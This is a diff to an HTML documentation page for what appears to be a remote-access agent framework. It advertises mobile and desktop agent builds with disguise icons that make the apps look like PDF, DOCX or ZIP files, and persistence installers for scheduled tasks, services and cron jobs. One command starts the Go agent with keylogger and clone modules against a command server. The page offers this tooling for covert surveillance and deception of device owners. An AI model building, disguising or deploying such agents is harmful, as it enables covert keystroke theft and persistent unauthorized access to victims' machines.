@@ -373,7 +373,7 @@
       <div class="chips">
         <span class="chip compiled">android&nbsp;apk</span><span class="chip compiled">ios&nbsp;ipa</span>
       </div>
-      <p style="margin-top:var(--sp3);">Android builds need Gradle + the Android SDK on the server; iOS requires macOS with Xcode. Both accept a custom artifact name and a disguise launcher icon (PDF &middot; DOCX &middot; XLSX &middot; PPTX &middot; ZIP &middot; RAR).</p>
+      <p style="margin-top:var(--sp3);">Android builds need Gradle + the Android SDK on the server; iOS builds run through the MobAI ios-builder CLI (any OS, a macOS server falls back to <code>xcrun</code> + iphoneos SDK). Both accept a custom artifact name and a disguise launcher icon (PDF &middot; DOCX &middot; XLSX &middot; PPTX &middot; ZIP &middot; RAR).</p>
     </div>
   </section>
 
@@ -382,7 +382,7 @@
     <div class="grid g3">
       <div class="card"><h3>Cross-compile from the dashboard</h3><p>Pick a compiled language and target in <b>Generate Agent</b>; the server builds on the fly and streams the binary for download. Toolchains are detected at install time.</p></div>
       <div class="card"><h3>Deterministic artifacts</h3><p>Every build is named <code>wym_&lt;lang&gt;_&lt;os&gt;_&lt;arch&gt;.&lt;ext&gt;</code> and cached behind a source hash — unchanged sources never recompile.</p></div>
-      <div class="card"><h3>Mobile builds (APK / IPA)</h3><p>Android <code>wym_android.apk</code> via Gradle + Android SDK, iOS <code>wym_ios.ipa</code> on macOS with Xcode. Custom artifact name + disguise icon (PDF/DOCX/XLSX/PPTX/ZIP/RAR) per build; a missing toolchain fails fast with a clear message.</p></div>
+      <div class="card"><h3>Mobile builds (APK / IPA)</h3><p>Android <code>wym_android.apk</code> via Gradle + Android SDK, iOS <code>wym_ios.ipa</code> via the MobAI ios-builder CLI on any OS (macOS can fall back to <code>xcrun</code>). Custom artifact name + disguise icon (PDF/DOCX/XLSX/PPTX/ZIP/RAR) per build; a missing toolchain fails fast with a clear message.</p></div>
       <div class="card"><h3>Runtime bundles</h3><p>Windows C/C++/Rust builds ship with their runtime DLLs; Java compiles to an executable jar (<code>wym_java_&lt;os&gt;_&lt;arch&gt;.jar</code>) tuned for <code>--release 11</code>, so it runs on any JRE 9+.</p></div>
       <div class="card"><h3>Platform-aware targets</h3><p>Targets are validated against the platform: C# binaries build only for Windows (<code>wym_csharp_win_x64.exe</code> / <code>wym_csharp_win_x86.exe</code>).</p></div>
       <div class="card"><h3>Service installers</h3><p><code>agent-service.ps1</code> and <code>agent-service.sh</code> turn any source into a Windows scheduled task / <code>sc</code> service, systemd or cron unit — persistence-ready but opt-in.</p></div>
@@ -418,9 +418,10 @@
 <span class="cm"># Linux / macOS</span>
 <span class="pf">$</span> bash install.sh</pre>
     <pre class="cmd" style="margin-top:var(--sp4);"><span class="cm"># Run an agent against your server (any supported runtime)</span>
+<span class="pf">$</span> cd clients
 <span class="pf">$</span> python agent.py  --server http://127.0.0.1:8000 --token YOUR_AGENT_TOKEN
 <span class="pf">$</span> node   agent.js  --server http://127.0.0.1:8000 --token YOUR_AGENT_TOKEN
-<span class="pf">$</span> go run agent.go   --server http://127.0.0.1:8000 --token YOUR_AGENT_TOKEN
+<span class="pf">$</span> go run agent.go clone_windows.go keylog_windows.go --server http://127.0.0.1:8000 --token YOUR_AGENT_TOKEN <span class="cm"># (Linux: clone_unix.go keylog_linux.go &middot; macOS: keylog_darwin.go)</span>
 
 <span class="cm"># Flags have env-var fallbacks:  WYM_SERVER WYM_TOKEN WYM_INTERVAL WYM_JITTER WYM_STATE_FILE WYM_VERBOSE</span>
 <span class="pf">$</span> WYM_SERVER=http://127.0.0.1:8000 WYM_TOKEN=YOUR_AGENT_TOKEN python agent.py</pre>
